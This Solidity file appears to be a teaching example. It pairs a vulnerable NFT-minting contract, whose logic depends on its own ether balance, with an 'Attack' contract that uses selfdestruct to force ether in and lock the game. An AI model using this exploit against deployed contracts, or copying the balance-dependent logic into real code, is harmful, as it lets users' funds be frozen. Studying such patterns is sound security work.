// SPDX-License-Identifier : MIT

pragma solidity ^0.8.24;

contract Mint {
    address public minter;
    uint256 public target = 30 ether;

    function depositMintingEther() public payable {
        require(msg.value == 1 ether, "You can only mint one NFT at a time");
        uint256 bal = address(this).balance;

        require(bal <= target, "We have run out of NFTs");

        if (bal == target) {
            minter = msg.sender;
        }
    }

    function receiveFunds() public {
        require(msg.sender == minter);

        (bool success,) = msg.sender.call{ value: address(this).balance }("");
        require(success, "Cannot send funds");
    }
}

contract Attack {
    Mint badMinter;

    constructor(Mint _badMinter) {
        badMinter = Mint(_badMinter);
    }

    function spoiler() public payable {
        address payable mintAddress = payable(address(badMinter));
        selfdestruct(mintAddress);
    }
}
